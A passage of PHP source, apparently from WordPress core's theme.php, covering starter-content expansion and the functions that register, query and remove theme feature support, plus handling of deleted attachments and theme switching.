					"<!-- wp:paragraph -->\n<p>%s</p>\n<!-- /wp:paragraph -->",
					_x( 'You might be an artist who would like to introduce yourself and your work here or maybe you are a business with a mission to describe.', 'Theme starter content' )
				),
			),
			'contact'          => array(
				'post_type'    => 'page',
				'post_title'   => _x( 'Contact', 'Theme starter content' ),
				'post_content' => sprintf(
					"<!-- wp:paragraph -->\n<p>%s</p>\n<!-- /wp:paragraph -->",
					_x( 'This is a page with some basic contact information, such as an address and phone number. You might also try a plugin to add a contact form.', 'Theme starter content' )
				),
			),
			'blog'             => array(
				'post_type'  => 'page',
				'post_title' => _x( 'Blog', 'Theme starter content' ),
			),
			'news'             => array(
				'post_type'  => 'page',
				'post_title' => _x( 'News', 'Theme starter content' ),
			),

			'homepage-section' => array(
				'post_type'    => 'page',
				'post_title'   => _x( 'A homepage section', 'Theme starter content' ),
				'post_content' => sprintf(
					"<!-- wp:paragraph -->\n<p>%s</p>\n<!-- /wp:paragraph -->",
					_x( 'This is an example of a homepage section. Homepage sections can be any page other than the homepage itself, including the page that shows your latest blog posts.', 'Theme starter content' )
				),
			),
		),
	);

	$content = array();

	foreach ( $config as $type => $args ) {
		switch ( $type ) {
			// Use options and theme_mods as-is.
			case 'options':
			case 'theme_mods':
				$content[ $type ] = $config[ $type ];
				break;

			// Widgets are grouped into sidebars.
			case 'widgets':
				foreach ( $config[ $type ] as $sidebar_id => $widgets ) {
					foreach ( $widgets as $id => $widget ) {
						if ( is_array( $widget ) ) {

							// Item extends core content.
							if ( ! empty( $core_content[ $type ][ $id ] ) ) {
								$widget = array(
									$core_content[ $type ][ $id ][0],array_merge( $core_content[ $type ][ $id ][1], $widget ),
								);
							}

							$content[ $type ][ $sidebar_id ][] = $widget;
						} elseif ( is_string( $widget )
							&& ! empty( $core_content[ $type ] )
							&& ! empty( $core_content[ $type ][ $widget ] )
						) {
							$content[ $type ][ $sidebar_id ][] = $core_content[ $type ][ $widget ];
						}
					}
				}
				break;

			// And nav menu items are grouped into nav menus.
			case 'nav_menus':
				foreach ( $config[ $type ] as $nav_menu_location => $nav_menu ) {

					// Ensure nav menus get a name.
					if ( empty( $nav_menu['name'] ) ) {
						$nav_menu['name'] = $nav_menu_location;
					}

					$content[ $type ][ $nav_menu_location ]['name'] = $nav_menu['name'];

					foreach ( $nav_menu['items'] as $id => $nav_menu_item ) {
						if ( is_array( $nav_menu_item ) ) {

							// Item extends core content.
							if ( ! empty( $core_content[ $type ][ $id ] ) ) {
								$nav_menu_item = array_merge( $core_content[ $type ][ $id ], $nav_menu_item );
							}

							$content[ $type ][ $nav_menu_location ]['items'][] = $nav_menu_item;
						} elseif ( is_string( $nav_menu_item )
							&& ! empty( $core_content[ $type ] )
							&& ! empty( $core_content[ $type ][ $nav_menu_item ] )
						) {
							$content[ $type ][ $nav_menu_location ]['items'][] = $core_content[ $type ][ $nav_menu_item ];
						}
					}
				}
				break;

			// Attachments are posts but have special treatment.
			case 'attachments':
				foreach ( $config[ $type ] as $id => $item ) {
					if ( ! empty( $item['file'] ) ) {
						$content[ $type ][ $id ] = $item;
					}
				}
				break;

			/*
			 * All that's left now are posts (besides attachments).
			 * Not a default case for the sake of clarity and future work.
			 */
			case 'posts':
				foreach ( $config[ $type ] as $id => $item ) {
					if ( is_array( $item ) ) {

						// Item extends core content.
						if ( ! empty( $core_content[ $type ][ $id ] ) ) {
							$item = array_merge( $core_content[ $type ][ $id ], $item );
						}

						// Enforce a subset of fields.
						$content[ $type ][ $id ] = wp_array_slice_assoc(
							$item,
							array(
								'post_type',
								'post_title',
								'post_excerpt',
								'post_name',
								'post_content',
								'menu_order',
								'comment_status',
								'thumbnail',
								'template',
							)
						);
					} elseif ( is_string( $item ) && ! empty( $core_content[ $type ][ $item ] ) ) {
						$content[ $type ][ $item ] = $core_content[ $type ][ $item ];
					}
				}
				break;
		}
	}

	/**
	 * Filters the expanded array of starter content.
	 *
	 * @since 4.7.0
	 *
	 * @param array $content Array of starter content.
	 * @param array $config  Array of theme-specific starter content configuration.
	 */
	return apply_filters( 'get_theme_starter_content', $content, $config );
}

/**
 * Registers theme support for a given feature.
 *
 * Must be called in the theme's functions.php file to work.
 * If attached to a hook, it must be {@see 'after_setup_theme'}.
 * The {@see 'init'} hook may be too late for some features.
 *
 * Example usage:
 *
 *     add_theme_support( 'title-tag' );
 *     add_theme_support( 'custom-logo', array(
 *         'height' => 480,
 *         'width'  => 720,
 *     ) );
 *
 * @since 2.9.0
 * @since 3.4.0 The `custom-header-uploads` feature was deprecated.
 * @since 3.6.0 The `html5` feature was added.
 * @since 3.6.1 The `html5` feature requires an array of types to be passed. Defaults to
 *              'comment-list', 'comment-form', 'search-form' for backward compatibility.
 * @since 3.9.0 The `html5` feature now also accepts 'gallery' and 'caption'.
 * @since 4.1.0 The `title-tag` feature was added.
 * @since 4.5.0 The `customize-selective-refresh-widgets` feature was added.
 * @since 4.7.0 The `starter-content` feature was added.
 * @since 5.0.0 The `responsive-embeds`, `align-wide`, `dark-editor-style`, `disable-custom-colors`,
 *              `disable-custom-font-sizes`, `editor-color-palette`, `editor-font-sizes`,
 *              `editor-styles`, and `wp-block-styles` features were added.
 * @since 5.3.0 The `html5` feature now also accepts 'script' and 'style'.
 * @since 5.3.0 Formalized the existing and already documented `...$args` parameter
 *              by adding it to the function signature.
 * @since 5.4.0 The `disable-custom-gradients` feature limits to default gradients or gradients added
 *              through `editor-gradient-presets` theme support.
 * @since 5.5.0 The `core-block-patterns` feature was added and is enabled by default.
 * @since 5.5.0 The `custom-logo` feature now also accepts 'unlink-homepage-logo'.
 * @since 5.6.0 The `post-formats` feature warns if no array is passed as the second parameter.
 * @since 5.8.0 The `widgets-block-editor` feature enables the Widgets block editor.
 * @since 5.8.0 The `block-templates` feature indicates whether a theme uses block-based templates.
 * @since 6.0.0 The `html5` feature warns if no array is passed as the second parameter.
 * @since 6.1.0 The `block-template-parts` feature allows to edit any reusable template part from site editor.
 * @since 6.1.0 The `disable-layout-styles` feature disables the default layout styles.
 * @since 6.3.0 The `link-color` feature allows to enable the link color setting.
 * @since 6.3.0 The `border` feature allows themes without theme.json to add border styles to blocks.
 * @since 6.5.0 The `appearance-tools` feature enables a few design tools for blocks,
 *              see `WP_Theme_JSON::APPEARANCE_TOOLS_OPT_INS` for a complete list.
 * @since 6.6.0 The `editor-spacing-sizes` feature was added.
 *
 * @global array $_wp_theme_features
 *
 * @param string $feature The feature being added. Likely core values include:
 *                          - 'admin-bar'
 *                          - 'align-wide'
 *                          - 'appearance-tools'
 *                          - 'automatic-feed-links'
 *                          - 'block-templates'
 *                          - 'block-template-parts'
 *                          - 'border'
 *                          - 'core-block-patterns'
 *                          - 'custom-background'
 *                          - 'custom-header'
 *                          - 'custom-line-height'
 *                          - 'custom-logo'
 *                          - 'customize-selective-refresh-widgets'
 *                          - 'custom-spacing'
 *                          - 'custom-units'
 *                          - 'dark-editor-style'
 *                          - 'disable-custom-colors'
 *                          - 'disable-custom-font-sizes'
 *                          - 'disable-custom-gradients'
 *                          - 'disable-layout-styles'
 *                          - 'editor-color-palette'
 *                          - 'editor-gradient-presets'
 *                          - 'editor-font-sizes'
 *                          - 'editor-spacing-sizes'
 *                          - 'editor-styles'
 *                          - 'featured-content'
 *                          - 'html5'
 *                          - 'link-color'
 *                          - 'menus'
 *                          - 'post-formats'
 *                          - 'post-thumbnails'
 *                          - 'responsive-embeds'
 *                          - 'starter-content'
 *                          - 'title-tag'
 *                          - 'widgets'
 *                          - 'widgets-block-editor'
 *                          - 'wp-block-styles'
 * @param mixed  ...$args Optional extra arguments to pass along with certain features.
 * @return void|false Void on success, false on failure.
 */
function add_theme_support( $feature, ...$args ) {
	global $_wp_theme_features;

	if ( ! $args ) {
		$args = true;
	}

	switch ( $feature ) {
		case 'post-thumbnails':
			// All post types are already supported.
			if ( true === get_theme_support( 'post-thumbnails' ) ) {
				return;
			}

			/*
			 * Merge post types with any that already declared their support
			 * for post thumbnails.
			 */
			if ( isset( $args[0] ) && is_array( $args[0] ) && isset( $_wp_theme_features['post-thumbnails'] ) ) {
				$args[0] = array_unique( array_merge( $_wp_theme_features['post-thumbnails'][0], $args[0] ) );
			}

			break;

		case 'post-formats':
			if ( isset( $args[0] ) && is_array( $args[0] ) ) {
				$post_formats = get_post_format_slugs();
				unset( $post_formats['standard'] );

				$args[0] = array_intersect( $args[0], array_keys( $post_formats ) );
			} else {
				_doing_it_wrong(
					"add_theme_support( 'post-formats' )",
					__( 'You need to pass an array of post formats.' ),
					'5.6.0'
				);
				return false;
			}
			break;

		case 'html5':
			// You can't just pass 'html5', you need to pass an array of types.
			if ( empty( $args[0] ) || ! is_array( $args[0] ) ) {
				_doing_it_wrong(
					"add_theme_support( 'html5' )",
					__( 'You need to pass an array of types.' ),
					'3.6.1'
				);

				if ( ! empty( $args[0] ) && ! is_array( $args[0] ) ) {
					return false;
				}

				// Build an array of types for back-compat.
				$args = array( 0 => array( 'comment-list', 'comment-form', 'search-form' ) );
			}

			// Calling 'html5' again merges, rather than overwrites.
			if ( isset( $_wp_theme_features['html5'] ) ) {
				$args[0] = array_merge( $_wp_theme_features['html5'][0], $args[0] );
			}
			break;

		case 'custom-logo':
			if ( true === $args ) {
				$args = array( 0 => array() );
			}
			$defaults = array(
				'width'                => null,
				'height'               => null,
				'flex-width'           => false,
				'flex-height'          => false,
				'header-text'          => '',
				'unlink-homepage-logo' => false,
			);
			$args[0]  = wp_parse_args( array_intersect_key( $args[0], $defaults ), $defaults );

			// Allow full flexibility if no size is specified.
			if ( is_null( $args[0]['width'] ) && is_null( $args[0]['height'] ) ) {
				$args[0]['flex-width']  = true;
				$args[0]['flex-height'] = true;
			}
			break;

		case 'custom-header-uploads':
			return add_theme_support( 'custom-header', array( 'uploads' => true ) );

		case 'custom-header':
			if ( true === $args ) {
				$args = array( 0 => array() );
			}

			$defaults = array(
				'default-image'          => '',
				'random-default'         => false,
				'width'                  => 0,
				'height'                 => 0,
				'flex-height'            => false,
				'flex-width'             => false,
				'default-text-color'     => '',
				'header-text'            => true,
				'uploads'                => true,
				'wp-head-callback'       => '',
				'admin-head-callback'    => '',
				'admin-preview-callback' => '',
				'video'                  => false,
				'video-active-callback'  => 'is_front_page',
			);

			$jit = isset( $args[0]['__jit'] );
			unset( $args[0]['__jit'] );

			/*
			 * Merge in data from previous add_theme_support() calls.
			 * The first value registered wins. (A child theme is set up first.)
			 */
			if ( isset( $_wp_theme_features['custom-header'] ) ) {
				$args[0] = wp_parse_args( $_wp_theme_features['custom-header'][0], $args[0] );
			}

			/*
			 * Load in the defaults at the end, as we need to insure first one wins.
			 * This will cause all constants to be defined, as each arg will then be set to the default.
			 */
			if ( $jit ) {
				$args[0] = wp_parse_args( $args[0], $defaults );
			}

			/*
			 * If a constant was defined, use that value. Otherwise, define the constant to ensure
			 * the constant is always accurate (and is not defined later,  overriding our value).
			 * As stated above, the first value wins.
			 * Once we get to wp_loaded (just-in-time), define any constants we haven't already.
			 * Constants should be avoided. Don't reference them. This is just for backward compatibility.
			 */

			if ( defined( 'NO_HEADER_TEXT' ) ) {
				$args[0]['header-text'] = ! NO_HEADER_TEXT;
			} elseif ( isset( $args[0]['header-text'] ) ) {
				define( 'NO_HEADER_TEXT', empty( $args[0]['header-text'] ) );
			}

			if ( defined( 'HEADER_IMAGE_WIDTH' ) ) {
				$args[0]['width'] = (int) HEADER_IMAGE_WIDTH;
			} elseif ( isset( $args[0]['width'] ) ) {
				define( 'HEADER_IMAGE_WIDTH', (int) $args[0]['width'] );
			}

			if ( defined( 'HEADER_IMAGE_HEIGHT' ) ) {
				$args[0]['height'] = (int) HEADER_IMAGE_HEIGHT;
			} elseif ( isset( $args[0]['height'] ) ) {
				define( 'HEADER_IMAGE_HEIGHT', (int) $args[0]['height'] );
			}

			if ( defined( 'HEADER_TEXTCOLOR' ) ) {
				$args[0]['default-text-color'] = HEADER_TEXTCOLOR;
			} elseif ( isset( $args[0]['default-text-color'] ) ) {
				define( 'HEADER_TEXTCOLOR', $args[0]['default-text-color'] );
			}

			if ( defined( 'HEADER_IMAGE' ) ) {
				$args[0]['default-image'] = HEADER_IMAGE;
			} elseif ( isset( $args[0]['default-image'] ) ) {
				define( 'HEADER_IMAGE', $args[0]['default-image'] );
			}

			if ( $jit && ! empty( $args[0]['default-image'] ) ) {
				$args[0]['random-default'] = false;
			}

			/*
			 * If headers are supported, and we still don't have a defined width or height,
			 * we have implicit flex sizes.
			 */
			if ( $jit ) {
				if ( empty( $args[0]['width'] ) && empty( $args[0]['flex-width'] ) ) {
					$args[0]['flex-width'] = true;
				}
				if ( empty( $args[0]['height'] ) && empty( $args[0]['flex-height'] ) ) {
					$args[0]['flex-height'] = true;
				}
			}

			break;

		case 'custom-background':
			if ( true === $args ) {
				$args = array( 0 => array() );
			}

			$defaults = array(
				'default-image'          => '',
				'default-preset'         => 'default',
				'default-position-x'     => 'left',
				'default-position-y'     => 'top',
				'default-size'           => 'auto',
				'default-repeat'         => 'repeat',
				'default-attachment'     => 'scroll',
				'default-color'          => '',
				'wp-head-callback'       => '_custom_background_cb',
				'admin-head-callback'    => '',
				'admin-preview-callback' => '',
			);

			$jit = isset( $args[0]['__jit'] );
			unset( $args[0]['__jit'] );

			// Merge in data from previous add_theme_support() calls. The first value registered wins.
			if ( isset( $_wp_theme_features['custom-background'] ) ) {
				$args[0] = wp_parse_args( $_wp_theme_features['custom-background'][0], $args[0] );
			}

			if ( $jit ) {
				$args[0] = wp_parse_args( $args[0], $defaults );
			}

			if ( defined( 'BACKGROUND_COLOR' ) ) {
				$args[0]['default-color'] = BACKGROUND_COLOR;
			} elseif ( isset( $args[0]['default-color'] ) || $jit ) {
				define( 'BACKGROUND_COLOR', $args[0]['default-color'] );
			}

			if ( defined( 'BACKGROUND_IMAGE' ) ) {
				$args[0]['default-image'] = BACKGROUND_IMAGE;
			} elseif ( isset( $args[0]['default-image'] ) || $jit ) {
				define( 'BACKGROUND_IMAGE', $args[0]['default-image'] );
			}

			break;

		// Ensure that 'title-tag' is accessible in the admin.
		case 'title-tag':
			// Can be called in functions.php but must happen before wp_loaded, i.e. not in header.php.
			if ( did_action( 'wp_loaded' ) ) {
				_doing_it_wrong(
					"add_theme_support( 'title-tag' )",
					sprintf(
						/* translators: 1: title-tag, 2: wp_loaded */
						__( 'Theme support for %1$s should be registered before the %2$s hook.' ),
						'<code>title-tag</code>',
						'<code>wp_loaded</code>'
					),
					'4.1.0'
				);

				return false;
			}
	}

	$_wp_theme_features[ $feature ] = $args;
}

/**
 * Registers the internal custom header and background routines.
 *
 * @since 3.4.0
 * @access private
 *
 * @global Custom_Image_Header $custom_image_header
 * @global Custom_Background   $custom_background
 */
function _custom_header_background_just_in_time() {
	global $custom_image_header, $custom_background;

	if ( current_theme_supports( 'custom-header' ) ) {
		// In case any constants were defined after an add_custom_image_header() call, re-run.
		add_theme_support( 'custom-header', array( '__jit' => true ) );

		$args = get_theme_support( 'custom-header' );
		if ( $args[0]['wp-head-callback'] ) {
			add_action( 'wp_head', $args[0]['wp-head-callback'] );
		}

		if ( is_admin() ) {
			require_once ABSPATH . 'wp-admin/includes/class-custom-image-header.php';
			$custom_image_header = new Custom_Image_Header( $args[0]['admin-head-callback'], $args[0]['admin-preview-callback'] );
		}
	}

	if ( current_theme_supports( 'custom-background' ) ) {
		// In case any constants were defined after an add_custom_background() call, re-run.
		add_theme_support( 'custom-background', array( '__jit' => true ) );

		$args = get_theme_support( 'custom-background' );
		add_action( 'wp_head', $args[0]['wp-head-callback'] );

		if ( is_admin() ) {
			require_once ABSPATH . 'wp-admin/includes/class-custom-background.php';
			$custom_background = new Custom_Background( $args[0]['admin-head-callback'], $args[0]['admin-preview-callback'] );
		}
	}
}

/**
 * Adds CSS to hide header text for custom logo, based on Customizer setting.
 *
 * @since 4.5.0
 * @access private
 */
function _custom_logo_header_styles() {
	if ( ! current_theme_supports( 'custom-header', 'header-text' )
		&& get_theme_support( 'custom-logo', 'header-text' )
		&& ! get_theme_mod( 'header_text', true )
	) {
		$classes = (array) get_theme_support( 'custom-logo', 'header-text' );
		$classes = array_map( 'sanitize_html_class', $classes );
		$classes = '.' . implode( ', .', $classes );

		$type_attr = current_theme_supports( 'html5', 'style' ) ? '' : ' type="text/css"';
		?>
		<!-- Custom Logo: hide header text -->
		<style id="custom-logo-css"<?php echo $type_attr; ?>>
			<?php echo $classes; ?> {
				position: absolute;
				clip: rect(1px, 1px, 1px, 1px);
			}
		</style>
		<?php
	}
}

/**
 * Gets the theme support arguments passed when registering that support.
 *
 * Example usage:
 *
 *     get_theme_support( 'custom-logo' );
 *     get_theme_support( 'custom-header', 'width' );
 *
 * @since 3.1.0
 * @since 5.3.0 Formalized the existing and already documented `...$args` parameter
 *              by adding it to the function signature.
 *
 * @global array $_wp_theme_features
 *
 * @param string $feature The feature to check. See add_theme_support() for the list
 *                        of possible values.
 * @param mixed  ...$args Optional extra arguments to be checked against certain features.
 * @return mixed The array of extra arguments or the value for the registered feature.
 */
function get_theme_support( $feature, ...$args ) {
	global $_wp_theme_features;

	if ( ! isset( $_wp_theme_features[ $feature ] ) ) {
		return false;
	}

	if ( ! $args ) {
		return $_wp_theme_features[ $feature ];
	}

	switch ( $feature ) {
		case 'custom-logo':
		case 'custom-header':
		case 'custom-background':
			if ( isset( $_wp_theme_features[ $feature ][0][ $args[0] ] ) ) {
				return $_wp_theme_features[ $feature ][0][ $args[0] ];
			}
			return false;

		default:
			return $_wp_theme_features[ $feature ];
	}
}

/**
 * Allows a theme to de-register its support of a certain feature
 *
 * Should be called in the theme's functions.php file. Generally would
 * be used for child themes to override support from the parent theme.
 *
 * @since 3.0.0
 *
 * @see add_theme_support()
 *
 * @param string $feature The feature being removed. See add_theme_support() for the list
 *                        of possible values.
 * @return bool|void Whether feature was removed.
 */
function remove_theme_support( $feature ) {
	// Do not remove internal registrations that are not used directly by themes.
	if ( in_array( $feature, array( 'editor-style', 'widgets', 'menus' ), true ) ) {
		return false;
	}

	return _remove_theme_support( $feature );
}

/**
 * Do not use. Removes theme support internally without knowledge of those not used
 * by themes directly.
 *
 * @access private
 * @since 3.1.0
 * @global array               $_wp_theme_features
 * @global Custom_Image_Header $custom_image_header
 * @global Custom_Background   $custom_background
 *
 * @param string $feature The feature being removed. See add_theme_support() for the list
 *                        of possible values.
 * @return bool True if support was removed, false if the feature was not registered.
 */
function _remove_theme_support( $feature ) {
	global $_wp_theme_features;

	switch ( $feature ) {
		case 'custom-header-uploads':
			if ( ! isset( $_wp_theme_features['custom-header'] ) ) {
				return false;
			}
			add_theme_support( 'custom-header', array( 'uploads' => false ) );
			return; // Do not continue - custom-header-uploads no longer exists.
	}

	if ( ! isset( $_wp_theme_features[ $feature ] ) ) {
		return false;
	}

	switch ( $feature ) {
		case 'custom-header':
			if ( ! did_action( 'wp_loaded' ) ) {
				break;
			}
			$support = get_theme_support( 'custom-header' );
			if ( isset( $support[0]['wp-head-callback'] ) ) {
				remove_action( 'wp_head', $support[0]['wp-head-callback'] );
			}
			if ( isset( $GLOBALS['custom_image_header'] ) ) {
				remove_action( 'admin_menu', array( $GLOBALS['custom_image_header'], 'init' ) );
				unset( $GLOBALS['custom_image_header'] );
			}
			break;

		case 'custom-background':
			if ( ! did_action( 'wp_loaded' ) ) {
				break;
			}
			$support = get_theme_support( 'custom-background' );
			if ( isset( $support[0]['wp-head-callback'] ) ) {
				remove_action( 'wp_head', $support[0]['wp-head-callback'] );
			}
			remove_action( 'admin_menu', array( $GLOBALS['custom_background'], 'init' ) );
			unset( $GLOBALS['custom_background'] );
			break;
	}

	unset( $_wp_theme_features[ $feature ] );

	return true;
}

/**
 * Checks a theme's support for a given feature.
 *
 * Example usage:
 *
 *     current_theme_supports( 'custom-logo' );
 *     current_theme_supports( 'html5', 'comment-form' );
 *
 * @since 2.9.0
 * @since 5.3.0 Formalized the existing and already documented `...$args` parameter
 *              by adding it to the function signature.
 *
 * @global array $_wp_theme_features
 *
 * @param string $feature The feature being checked. See add_theme_support() for the list
 *                        of possible values.
 * @param mixed  ...$args Optional extra arguments to be checked against certain features.
 * @return bool True if the active theme supports the feature, false otherwise.
 */
function current_theme_supports( $feature, ...$args ) {
	global $_wp_theme_features;

	if ( 'custom-header-uploads' === $feature ) {
		return current_theme_supports( 'custom-header', 'uploads' );
	}

	if ( ! isset( $_wp_theme_features[ $feature ] ) ) {
		return false;
	}

	// If no args passed then no extra checks need to be performed.
	if ( ! $args ) {
		/** This filter is documented in wp-includes/theme.php */
		return apply_filters( "current_theme_supports-{$feature}", true, $args, $_wp_theme_features[ $feature ] ); // phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores
	}

	switch ( $feature ) {
		case 'post-thumbnails':
			/*
			 * post-thumbnails can be registered for only certain content/post types
			 * by passing an array of types to add_theme_support().
			 * If no array was passed, then any type is accepted.
			 */
			if ( true === $_wp_theme_features[ $feature ] ) {  // Registered for all types.
				return true;
			}
			$content_type = $args[0];
			return in_array( $content_type, $_wp_theme_features[ $feature ][0], true );

		case 'html5':
		case 'post-formats':
			/*
			 * Specific post formats can be registered by passing an array of types
			 * to add_theme_support().
			 *
			 * Specific areas of HTML5 support *must* be passed via an array to add_theme_support().
			 */
			$type = $args[0];
			return in_array( $type, $_wp_theme_features[ $feature ][0], true );

		case 'custom-logo':
		case 'custom-header':
		case 'custom-background':
			// Specific capabilities can be registered by passing an array to add_theme_support().
			return ( isset( $_wp_theme_features[ $feature ][0][ $args[0] ] ) && $_wp_theme_features[ $feature ][0][ $args[0] ] );
	}

	/**
	 * Filters whether the active theme supports a specific feature.
	 *
	 * The dynamic portion of the hook name, `$feature`, refers to the specific
	 * theme feature. See add_theme_support() for the list of possible values.
	 *
	 * @since 3.4.0
	 *
	 * @param bool   $supports Whether the active theme supports the given feature. Default true.
	 * @param array  $args     Array of arguments for the feature.
	 * @param string $feature  The theme feature.
	 */
	return apply_filters( "current_theme_supports-{$feature}", true, $args, $_wp_theme_features[ $feature ] ); // phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores
}

/**
 * Checks a theme's support for a given feature before loading the functions which implement it.
 *
 * @since 2.9.0
 *
 * @param string $feature The feature being checked. See add_theme_support() for the list
 *                        of possible values.
 * @param string $file    Path to the file.
 * @return bool True if the active theme supports the supplied feature, false otherwise.
 */
function require_if_theme_supports( $feature, $file ) {
	if ( current_theme_supports( $feature ) ) {
		require $file;
		return true;
	}
	return false;
}

/**
 * Registers a theme feature for use in add_theme_support().
 *
 * This does not indicate that the active theme supports the feature, it only describes
 * the feature's supported options.
 *
 * @since 5.5.0
 *
 * @see add_theme_support()
 *
 * @global array $_wp_registered_theme_features
 *
 * @param string $feature The name uniquely identifying the feature. See add_theme_support()
 *                        for the list of possible values.
 * @param array  $args {
 *     Data used to describe the theme.
 *
 *     @type string     $type         The type of data associated with this feature.
 *                                    Valid values are 'string', 'boolean', 'integer',
 *                                    'number', 'array', and 'object'. Defaults to 'boolean'.
 *     @type bool       $variadic     Does this feature utilize the variadic support
 *                                    of add_theme_support(), or are all arguments specified
 *                                    as the second parameter. Must be used with the "array" type.
 *     @type string     $description  A short description of the feature. Included in
 *                                    the Themes REST API schema. Intended for developers.
 *     @type bool|array $show_in_rest {
 *         Whether this feature should be included in the Themes REST API endpoint.
 *         Defaults to not being included. When registering an 'array' or 'object' type,
 *         this argument must be an array with the 'schema' key.
 *
 *         @type array    $schema           Specifies the JSON Schema definition describing
 *                                          the feature. If any objects in the schema do not include
 *                                          the 'additionalProperties' keyword, it is set to false.
 *         @type string   $name             An alternate name to be used as the property name
 *                                          in the REST API.
 *         @type callable $prepare_callback A function used to format the theme support in the REST API.
 *                                          Receives the raw theme support value.
 *      }
 * }
 * @return true|WP_Error True if the theme feature was successfully registered, a WP_Error object if not.
 */
function register_theme_feature( $feature, $args = array() ) {
	global $_wp_registered_theme_features;

	if ( ! is_array( $_wp_registered_theme_features ) ) {
		$_wp_registered_theme_features = array();
	}

	$defaults = array(
		'type'         => 'boolean',
		'variadic'     => false,
		'description'  => '',
		'show_in_rest' => false,
	);

	$args = wp_parse_args( $args, $defaults );

	if ( true === $args['show_in_rest'] ) {
		$args['show_in_rest'] = array();
	}

	if ( is_array( $args['show_in_rest'] ) ) {
		$args['show_in_rest'] = wp_parse_args(
			$args['show_in_rest'],
			array(
				'schema'           => array(),
				'name'             => $feature,
				'prepare_callback' => null,
			)
		);
	}

	if ( ! in_array( $args['type'], array( 'string', 'boolean', 'integer', 'number', 'array', 'object' ), true ) ) {
		return new WP_Error(
			'invalid_type',
			__( 'The feature "type" is not valid JSON Schema type.' )
		);
	}

	if ( true === $args['variadic'] && 'array' !== $args['type'] ) {
		return new WP_Error(
			'variadic_must_be_array',
			__( 'When registering a "variadic" theme feature, the "type" must be an "array".' )
		);
	}

	if ( false !== $args['show_in_rest'] && in_array( $args['type'], array( 'array', 'object' ), true ) ) {
		if ( ! is_array( $args['show_in_rest'] ) || empty( $args['show_in_rest']['schema'] ) ) {
			return new WP_Error(
				'missing_schema',
				__( 'When registering an "array" or "object" feature to show in the REST API, the feature\'s schema must also be defined.' )
			);
		}

		if ( 'array' === $args['type'] && ! isset( $args['show_in_rest']['schema']['items'] ) ) {
			return new WP_Error(
				'missing_schema_items',
				__( 'When registering an "array" feature, the feature\'s schema must include the "items" keyword.' )
			);
		}

		if ( 'object' === $args['type'] && ! isset( $args['show_in_rest']['schema']['properties'] ) ) {
			return new WP_Error(
				'missing_schema_properties',
				__( 'When registering an "object" feature, the feature\'s schema must include the "properties" keyword.' )
			);
		}
	}

	if ( is_array( $args['show_in_rest'] ) ) {
		if ( isset( $args['show_in_rest']['prepare_callback'] )
			&& ! is_callable( $args['show_in_rest']['prepare_callback'] )
		) {
			return new WP_Error(
				'invalid_rest_prepare_callback',
				sprintf(
					/* translators: %s: prepare_callback */
					__( 'The "%s" must be a callable function.' ),
					'prepare_callback'
				)
			);
		}

		$args['show_in_rest']['schema'] = wp_parse_args(
			$args['show_in_rest']['schema'],
			array(
				'description' => $args['description'],
				'type'        => $args['type'],
				'default'     => false,
			)
		);

		if ( is_bool( $args['show_in_rest']['schema']['default'] )
			&& ! in_array( 'boolean', (array) $args['show_in_rest']['schema']['type'], true )
		) {
			// Automatically include the "boolean" type when the default value is a boolean.
			$args['show_in_rest']['schema']['type'] = (array) $args['show_in_rest']['schema']['type'];
			array_unshift( $args['show_in_rest']['schema']['type'], 'boolean' );
		}

		$args['show_in_rest']['schema'] = rest_default_additional_properties_to_false( $args['show_in_rest']['schema'] );
	}

	$_wp_registered_theme_features[ $feature ] = $args;

	return true;
}

/**
 * Gets the list of registered theme features.
 *
 * @since 5.5.0
 *
 * @global array $_wp_registered_theme_features
 *
 * @return array[] List of theme features, keyed by their name.
 */
function get_registered_theme_features() {
	global $_wp_registered_theme_features;

	if ( ! is_array( $_wp_registered_theme_features ) ) {
		return array();
	}

	return $_wp_registered_theme_features;
}

/**
 * Gets the registration config for a theme feature.
 *
 * @since 5.5.0
 *
 * @global array $_wp_registered_theme_features
 *
 * @param string $feature The feature name. See add_theme_support() for the list
 *                        of possible values.
 * @return array|null The registration args, or null if the feature was not registered.
 */
function get_registered_theme_feature( $feature ) {
	global $_wp_registered_theme_features;

	if ( ! is_array( $_wp_registered_theme_features ) ) {
		return null;
	}

	return isset( $_wp_registered_theme_features[ $feature ] ) ? $_wp_registered_theme_features[ $feature ] : null;
}

/**
 * Checks an attachment being deleted to see if it's a header or background image.
 *
 * If true it removes the theme modification which would be pointing at the deleted
 * attachment.
 *
 * @access private
 * @since 3.0.0
 * @since 4.3.0 Also removes `header_image_data`.
 * @since 4.5.0 Also removes custom logo theme mods.
 * @since 6.6.0 Also removes `site_logo` option set by the site logo block.
 *
 * @param int $id The attachment ID.
 */
function _delete_attachment_theme_mod( $id ) {
	$attachment_image = wp_get_attachment_url( $id );
	$header_image     = get_header_image();
	$background_image = get_background_image();
	$custom_logo_id   = (int) get_theme_mod( 'custom_logo' );
	$site_logo_id     = (int) get_option( 'site_logo' );

	if ( $custom_logo_id && $custom_logo_id === $id ) {
		remove_theme_mod( 'custom_logo' );
		remove_theme_mod( 'header_text' );
	}

	if ( $site_logo_id && $site_logo_id === $id ) {
		delete_option( 'site_logo' );
	}

	if ( $header_image && $header_image === $attachment_image ) {
		remove_theme_mod( 'header_image' );
		remove_theme_mod( 'header_image_data' );
	}

	if ( $background_image && $background_image === $attachment_image ) {
		remove_theme_mod( 'background_image' );
	}
}

/**
 * Checks if a theme has been changed and runs 'after_switch_theme' hook on the next WP load.
 *
 * See {@see 'after_switch_theme'}.
 *
 * @since 3.3.0
 */
function check_theme_switched() {
	$stylesheet = get_option( 'theme_switched' );

	if ( $stylesheet ) {
		$old_theme = wp_get_theme( $stylesheet );

		// Prevent widget & menu mapping from running since Customizer already called it up front.
		if ( get_option( 'theme_switched_via_customizer' ) ) {
			remove_action( 'after_switch_theme', '_wp_menus_changed' );
			remove_action( 'after_switch_theme', '_wp_sidebars_changed' );
			update_option( 'theme_switched_via_customizer', false );
		}

		if ( $old_theme->exists() ) {
			/**
			 * Fires on the next WP load after the theme has been switched.
			 *
			 * The parameters differ according to whether the old theme exists or not.
			 * If the old theme is missing, the old name will instead be the slug
			 * of the old theme.
			 *
			 * See {@see 'switch_theme'}.
			 *
			 * @since 3.3.0
			 *
			 * @param string   $old_name  Old theme name.
			 * @param WP_Theme $old_theme WP_Theme instance of the old theme.
			 */
			do_action( 'after_switch_theme', $old_theme->get( 'Name' ), $old_theme );
		} else {
			/** This action is documented in wp-includes/theme.php */
			do_action( 'after_switch_theme', $stylesheet, $old_theme );
		}

		flush_rewrite_rules();

		update_option( 'theme_switched', false );
	}
}

/**
